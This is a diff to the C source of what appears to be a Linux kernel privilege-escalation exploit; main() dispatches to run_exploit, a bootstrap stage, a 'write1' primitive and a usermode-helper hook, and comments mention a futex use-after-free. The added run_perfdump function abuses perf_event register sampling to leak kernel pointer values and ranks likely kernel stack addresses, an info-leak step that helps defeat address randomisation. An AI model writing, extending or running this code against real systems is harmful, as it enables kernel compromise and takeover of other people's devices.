@@ -4557,11 +4557,108 @@ static int run_write1_only(void) {
   return 1;
 }
 
+/* --perfdump: standalone passive register histogram (no futex/UAF).
+ * Collects ALL sampled register values in kernel ranges and prints a
+ * value/page histogram — hunting kernel STACK addresses (vmap region
+ * 0xffffffc0+ excluded by task_ptr_ok; linear stacks 0xffffff80+). */
+static int run_perfdump(void) {
+  struct perf_leak pl;
+  memset(&pl, 0, sizeof(pl));
+  const char *mode = "none";
+  struct perf_event_attr pe;
+  int fd = perf_open_hw(0, &pe, &mode);
+  if (fd < 0) {
+    pr_info("perfdump: open failed (%s)\n", mode);
+    return 1;
+  }
+  pr_info("perfdump: mode=%s spinning getpid\n", mode);
+  size_t msz = 4096 * (1 + 32);
+  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (buf == MAP_FAILED) {
+    close(fd);
+    return 1;
+  }
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  for (volatile int i = 0; i < 3000000; i++)
+    syscall(__NR_getpid);
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+  struct perf_event_mmap_page *hdr = buf;
+  uint64_t head = hdr->data_head;
+  __sync_synchronize();
+  char *base = (char *)buf + 4096;
+  size_t dsz = 4096 * 32;
+  uint64_t pos = hdr->data_tail;
+#define PD_MAX 1024
+  uint64_t pd_val[PD_MAX];
+  int pd_cnt[PD_MAX];
+  int pd_n = 0;
+  int nsamp = 0;
+  while (pos < head) {
+    struct perf_event_header *ev = (void *)(base + (pos % dsz));
+    if (ev->size == 0)
+      break;
+    if (ev->type == PERF_RECORD_SAMPLE) {
+      char *p = (char *)ev + sizeof(*ev);
+      uint64_t ip = *(uint64_t *)p;
+      p += 8;
+      nsamp++;
+      uint64_t abi = *(uint64_t *)p;
+      p += 8;
+      if (abi == 1 || abi == 2) {
+        uint64_t *regs = (uint64_t *)p;
+        for (int r = 0; r < 33; r++) {
+          uint64_t v = regs[r];
+          if (v >= 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL &&
+              (v & 7) == 0) {
+            int f = -1;
+            for (int u = 0; u < pd_n; u++)
+              if (pd_val[u] == v) {
+                f = u;
+                break;
+              }
+            if (f < 0 && pd_n < PD_MAX) {
+              pd_val[pd_n] = v;
+              pd_cnt[pd_n] = 0;
+              f = pd_n++;
+            }
+            if (f >= 0)
+              pd_cnt[f]++;
+          }
+        }
+      }
+    }
+    pos += ev->size;
+  }
+  hdr->data_tail = head;
+  munmap(buf, msz);
+  close(fd);
+  pr_info("perfdump: samples=%d uniq=%d\n", nsamp, pd_n);
+  /* top-40 by count */
+  for (int rank = 0; rank < 40 && rank < pd_n; rank++) {
+    int best = -1;
+    for (int u = 0; u < pd_n; u++)
+      if (pd_cnt[u] > 0 && (best < 0 || pd_cnt[u] > pd_cnt[best]))
+        best = u;
+    if (best < 0)
+      break;
+    uint64_t v = pd_val[best];
+    const char *reg = (v >= 0xffffffc000000000ULL) ? "VMAP"
+                                                        : "LINEAR";
+    pr_info("perfdump[%02d] %016llx x%-4d %-6s page=%llx\n", rank,
+            (unsigned long long)v, pd_cnt[best], reg,
+            (unsigned long long)(v & ~0xfffull));
+    pd_cnt[best] = 0;
+  }
+  return 0;
+}
+
 int main(int argc, char **argv) {
     handle_umh_mode(argc, argv);
     if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
         return run_bootstrap();
     if (argc > 1 && strcmp(argv[1], "--write1") == 0)
         return run_write1_only();
+    if (argc > 1 && strcmp(argv[1], "--perfdump") == 0)
+        return run_perfdump();
     return run_exploit(argc, argv);
 }
